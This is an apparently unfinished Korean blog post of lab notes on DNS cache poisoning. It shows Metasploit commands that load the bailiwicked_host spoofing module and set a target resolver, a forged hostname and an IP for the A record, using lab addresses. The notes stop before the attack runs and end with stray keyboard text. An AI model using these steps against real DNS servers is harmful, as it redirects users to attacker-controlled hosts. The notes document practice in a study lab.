---
title:  "DNS Attack" 

categories:
  - spoofing
tags:
  - [DNS]

toc: true

date: 2022-10-04
last_modified_at: 2022-10-04
---

## DNS attack

- 구성도

![제목 없음](../../assets/img/제목 없음-1664867752525-1.png)

- 공격

  - kail

    > metasploit 실행

    ```
    ┌──(root㉿kali)-[~]
    └─# msfconsole
    ```

    ![화면 캡처 2022-10-04 161129](../../assets/img/화면 캡처 2022-10-04 161129.png)

    ```
    msf6 > use auxiliary/spoof/dns/bailiwicked_host
    ```

    ![화면 캡처 2022-10-04 162456](../../assets/img/화면 캡처 2022-10-04 162456.png)

    > 설정하기

    A 레코드 문자열

    ```
    msf6 auxiliary(spoof/dns/bailiwicked_host) > set hostname www.kh00.kh
    hostname => www.kh00.kh
    ```

    A레코드 IP 주소

    ```
    msf6 auxiliary(spoof/dns/bailiwicked_host) > set NEWADDR 200.200.200.254
    NEWADDR => 200.200.200.254
    ```

    공격대상 DNS

    ```
    msf6 auxiliary(spoof/dns/bailiwicked_host) > set RHOST 172.16.0.105 (공격대상 DNS)
    RHOST => 172.16.0.105
    ```

    root hint로 설정

    ```
    msf6 auxiliary(spoof/dns/bailiwicked_host) > set srcport 53 
    srcport => 53
    ```

    ![화면 캡처 2022-10-04 161524](../../assets/img/화면 캡처 2022-10-04 161524.png)

    ㄹㄹㅇㅁㄴ

    

    

